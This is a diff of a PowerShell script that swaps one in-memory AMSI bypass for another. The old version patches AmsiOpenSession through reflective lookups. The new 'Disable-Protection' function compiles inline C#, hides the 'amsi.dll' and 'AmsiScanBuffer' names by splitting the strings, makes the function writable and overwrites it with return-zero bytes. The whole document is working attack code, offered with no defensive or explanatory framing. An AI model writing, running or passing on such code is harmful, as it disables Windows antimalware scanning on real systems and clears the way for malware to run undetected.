@@ -1,43 +1,34 @@
-function LookupFunc {
-    Param ($moduleName, $functionName)
-    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
-    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
-     Equals('System.dll')
-     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $tmp=@()
-    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
-    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
-@($moduleName)), $functionName))
+function Disable-Protection {
+    $k = @"
+using System;
+using System.Runtime.InteropServices;
+public class P {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static bool Patch() {
+        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
+        if (a == IntPtr.Zero) return false;
+        UInt32 oldProtect;
+        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+        byte[] patch = { 0x31, 0xC0, 0xC3 };
+        Marshal.Copy(patch, 0, a, patch.Length);
+        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
+    }
+}
+"@
+    Add-Type -TypeDefinition $k
+    $result = [P]::Patch()
+    if ($result) {
+        Write-Output "Protection Disabled"
+    } else {
+        Write-Output "Failed to Disable Protection"
+    }
 }
 
-
-function getDelegateType {
-    Param (
-     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
-     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
-    )
-    $type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
-[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-    DefineDynamicModule('InMemoryModule', $false).
-    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
-    AutoClass', [System.MulticastDelegate])
-
-  $type.
-    DefineConstructor('RTSpecialName, HideBySig, Public',
-[System.Reflection.CallingConventions]::Standard, $func).
-     SetImplementationFlags('Runtime, Managed')
-
-  $type.
-    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
-$func). SetImplementationFlags('Runtime, Managed')
-    return $type.CreateType()
-}
-
-
-[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
-$oldProtectionBuffer = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-$buf = [Byte[]] (0x48,0x31,0xc9)  # Opcode for xor rcx, rcx;
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+Disable-Protection
